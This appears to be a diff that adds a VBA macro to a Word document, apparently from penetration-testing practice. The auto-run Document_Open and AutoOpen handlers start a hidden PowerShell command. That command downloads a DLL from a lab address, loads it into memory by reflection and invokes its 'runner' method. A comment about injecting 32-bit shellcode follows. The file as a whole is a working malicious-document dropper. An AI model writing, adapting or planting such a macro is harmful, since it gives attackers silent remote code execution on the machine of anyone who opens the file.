@@ -1,0 +1,15 @@
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim str As String
+    str = "powershell ""$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.94/ClassLibrary1.dll');$assem = [System.Reflection.Assembly]::Load($data);$class = $assem.GetType('ClassLibrary1.Class1');$method = $class.GetMethod('runner');$method.Invoke(0, $null)"""
+    Shell str, vbHide
+End Sub
+
+'REMEMBER word is 32 bit shellcode and injected process have to be 32 bit
